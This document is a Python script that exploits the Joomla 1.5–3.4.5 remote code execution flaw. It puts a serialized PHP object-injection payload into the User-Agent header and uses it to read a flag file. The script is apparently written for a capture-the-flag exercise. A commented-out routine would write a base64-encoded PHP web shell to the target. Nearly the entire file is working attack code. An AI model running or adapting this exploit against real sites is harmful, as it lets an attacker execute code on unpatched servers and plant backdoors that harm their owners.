#!/usr/bin/env python
# encoding:utf-8

import requests
import sys
import time
import re

def rceJoomla(value):
    now = time.strftime('%H:%M:%S',time.localtime(time.time()))
    print "["+str(now)+"] [INFO] Checking Joomla 1.5 - 3.4.5 Remote Code Execution..."
    if 'http://' in value or 'https://' in value:
        url=value
        checkJoomlaRCE(url)

def checkJoomlaRCE(url):
    url = url.strip()
    reg = 'http[s]*://.*/$'
    m = re.match(reg,url)
    if not m:
        url = url + "/"
    poc = generate_payload("system(base64_decode('%s'));" % ('cat /opt/flag/flag.txt'.encode("base64").replace("\n", "")))
    # poc = generate_payload("phpinfo();")
    result = get_url(url, poc)
    print result

def get_url(url, user_agent):
    headers = {
        'User-Agent': user_agent
    }
    cookies = requests.get(url,headers=headers).cookies
    for _ in range(3):
        response = requests.get(url, timeout=10, headers=headers, cookies=cookies, data={'c':'phpinfo();'})
    return response.content

def generate_payload(php_payload):
    php_payload = php_payload
    terminate = '\xf0\x9d\x8c\x86'
    exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
    injected_payload = "{};JFactory::getConfig();exit".format(php_payload)
    exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
    exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate
    # print exploit_template
    return exploit_template

def getInfoByJoomlaRCE(result, param):
    if "System" in param:
        reg = '.*<tr><td class="e">System </td><td class="v">([^<>]*?)</td></tr>.*'
    elif "DOCUMENT_ROOT" in param:
        reg = '.*<tr><td class="e">DOCUMENT_ROOT </td><td class="v">([^<>]*?)</td></tr>.*'
    elif "SCRIPT_FILENAME" in param:
        reg = '.*<tr><td class="e">SCRIPT_FILENAME </td><td class="v">([^<>]*?)</td></tr>.*'
    match_url = re.search(reg,result)
    if match_url:
        info=match_url.group(1)
    else:
        info = 'no info!'
    return info

'''
def getShellByJoomlaRCE(url, system, script_filename):
    if 'no info' not in script_filename and 'no info' not in system:
        if 'Windows' in system:
            shell = script_filename.split('index.php')[0].replace('/','//').strip()+"shell.php"
        else:
            shell = script_filename.split('index.php')[0]+"shell.php"
        cmd ="file_put_contents('"+shell+"',base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7ID8+'));"
        pl = generate_payload(cmd)
        try:
            get_url(url, pl)
            return url+"shell.php"
        except Exception, e:
            return "no info!"
    else:
        return "no info!"
'''

def get_flag(host, port):
    url = "http://%s:%d/" % (host, port)
    flag = rceJoomla(url)
    print flag
    return flag

if __name__ == '__main__':
    get_flag("192.168.187.1", 80)
